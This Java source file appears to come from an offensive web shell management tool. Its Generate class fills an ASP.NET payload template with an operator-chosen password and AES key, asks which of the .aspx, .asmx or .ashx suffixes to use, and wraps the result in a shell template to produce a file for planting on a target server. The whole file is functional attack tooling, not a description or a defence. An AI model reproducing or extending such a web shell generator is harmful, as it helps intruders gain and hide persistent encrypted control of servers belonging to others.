package shells.cryptions.cshapAes;

import java.awt.Component;
import java.io.InputStream;
import javax.swing.Icon;
import javax.swing.JOptionPane;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = {"aspx", "asmx", "ashx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        try {
            InputStream inputStream = Generate.class.getClassLoader().getResourceAsStream("shell/asp/template/" + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            String code2 = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            Object selectedValue = JOptionPane.showInputDialog((Component) null, "suffix", "selected suffix", 1, (Icon) null, SUFFIX, (Object) null);
            if (selectedValue == null) {
                return null;
            }
            InputStream inputStream2 = Generate.class.getClassLoader().getResourceAsStream("shell/asp/template/shell." + ((String) selectedValue));
            String template = new String(functions.readInputStream(inputStream2));
            inputStream2.close();
            return template.replace("{code}", code2).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public static void main(String[] args) {
        System.out.println();
    }
}
